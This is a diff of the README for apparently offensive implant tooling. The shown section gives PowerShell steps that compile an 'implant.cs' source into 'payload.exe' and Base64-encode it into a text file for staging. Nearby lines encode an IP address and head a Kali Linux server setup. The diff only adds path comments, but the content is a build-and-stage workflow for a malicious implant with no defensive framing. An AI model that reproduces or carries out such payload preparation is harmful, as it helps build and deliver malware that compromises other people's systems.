@@ -49,16 +49,18 @@ echo -n "192.168.x.x" | base64
 ### 2. 🖥️ Payload Preparation (Windows Dev)
 
 ```powershell
-# 1. Define .NET compiler
+# 1. Define .NET compiler (adjust path if needed)
 $csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
 
 # 2. Compile implant.cs
-& $csc /target:exe /out:"payload.exe" "payloads\implant.cs"
+# IMPORTANT: Always provide the full path to your source file and output file
+& $csc /target:exe /out:"<full-path-to-your-project>\payload.exe" "<full-path-to-your-project>\payloads\implant.cs"
 
 # 3. Convert binary to Base64
-$bytes = [IO.File]::ReadAllBytes("payload.exe")
-$b64 = [Convert]::ToBase64String($bytes)
-[System.IO.File]::WriteAllText("qpwoe64.txt", $b64)
+# IMPORTANT: Use the exact path to your payload.exe, not just "payload.exe"
+$bytes = [IO.File]::ReadAllBytes("<full-path-to-your-project>\payload.exe")
+$b64   = [Convert]::ToBase64String($bytes)
+[System.IO.File]::WriteAllText("<full-path-to-your-project>\qpwoe64.txt", $b64)
 ```
 
 ### 3. 🌐 Server Setup (Kali Linux)
